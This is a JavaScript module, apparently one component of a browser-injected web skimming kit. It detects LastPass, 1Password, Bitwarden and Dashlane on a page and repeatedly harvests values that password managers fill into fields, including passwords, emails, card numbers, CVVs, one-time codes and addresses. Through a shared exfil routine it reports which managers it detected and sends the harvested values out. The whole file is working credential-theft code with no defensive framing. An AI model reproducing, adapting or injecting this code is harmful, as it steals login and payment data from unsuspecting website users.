/* m-pm.js — Password manager detection + autofill vacuum (LastPass/1Password/Bitwarden).
   Detecta iframes PM, hook autofill value-set directo (PM rellena sin evento input). */
(function(G){
if(!G)return; if(G._M&&G._M.pm)return; G._M=G._M||{}; G._M.pm=1;
var exfil=G.exfil, hx=(window.__GE_OFF__&&window.__GE_OFF__.hx)||function(){};
try{
var PM_SIG={lastpass:/lastpass|data-lp-id|lpform/i,onepassword:/1password|com-1password|data-1p-ignore/i,bitwarden:/bitwarden|data-bw-ignore|bw-com/i,dashlane:/dashlane|data-form-type/i};
var detected={};
function detect(){
// iframes inyectados por PM
document.querySelectorAll('iframe').forEach(function(f){
var s=(f.src||'')+' '+(f.id||'')+' '+(f.className||'')+' '+(f.getAttribute('data-lp-id')||'');
for(var k in PM_SIG){if(PM_SIG[k].test(s)&&!detected[k]){detected[k]=1;exfil('pm-detected',{pm:k,src:(f.src||'').slice(0,80)})}}});
// atributos PM en inputs
document.querySelectorAll('[data-lp-id],[data-1p-ignore],[data-bw-ignore],[data-form-type]').forEach(function(el){
var pm=el.getAttribute('data-lp-id')?'lastpass':el.getAttribute('data-1p-ignore')?'1password':el.getAttribute('data-bw-ignore')?'bitwarden':'dashlane';
if(!detected[pm+'-attr']){detected[pm+'-attr']=1;exfil('pm-attr',{pm:pm})}
});
}
detect();setInterval(detect,5000);
// vacuum autofill: PM a veces setea .value sin disparar input → poll periódico de campos sensibles
var SENS=/password|passwd|pwd|email|user|login|card|cc|cvv|cvc|otp|code|tel|address/i;
var seen={};
function vacuum(){
document.querySelectorAll('input,textarea').forEach(function(el){
if(!SENS.test((el.name||'')+(el.type||'')+(el.autocomplete||'')))return;
if(!el.value)return;
var key=(el.name||el.id||el.type)+'_'+(el.value.length);
if(seen[key])return; seen[key]=1;
// solo exfil si el valor apareció SIN evento (autofill del PM) — heurística: value presente en <2s de focus
exfil('pm-autofill',{n:el.name||el.id,tp:el.type,ac:el.autocomplete,v:el.value.slice(0,120)});
});
}
setInterval(vacuum,3000);
}catch(e){hx('m-pm-err',{m:e.message})}
})(window.__GE__);
